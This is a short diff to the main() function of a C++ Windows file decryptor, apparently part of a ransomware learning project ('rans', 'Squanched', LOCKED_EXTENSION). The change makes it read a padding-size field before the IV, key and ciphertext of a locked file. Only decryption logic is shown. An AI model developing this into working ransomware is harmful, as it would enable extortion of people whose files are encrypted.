@@ -77,16 +77,18 @@ void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Ciphe
 int main()
 {
 	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans1.txt" + string(LOCKED_EXTENSION);
-	BYTE paddingSize = 1;
 	PBYTE iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
-	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN;
+	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
 	PBYTE cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 	std::ifstream ifile;
 	ifile.open(path, std::ios::binary);
 #ifdef DEBUG
 	cout << "file was" << (ifile.is_open() ? "" : "NOT") << "openned successfully" << endl;
 #endif
+	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = {0};
+	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
+	BYTE paddingSize = strtol(paddingSizeTmpBuff,NULL,10);
 	ifile.read((char*)iv, IV_LEN);
 	ifile.read((char*)key, KEY_LEN);
 	ifile.read((char*)cipher, cipherSize);
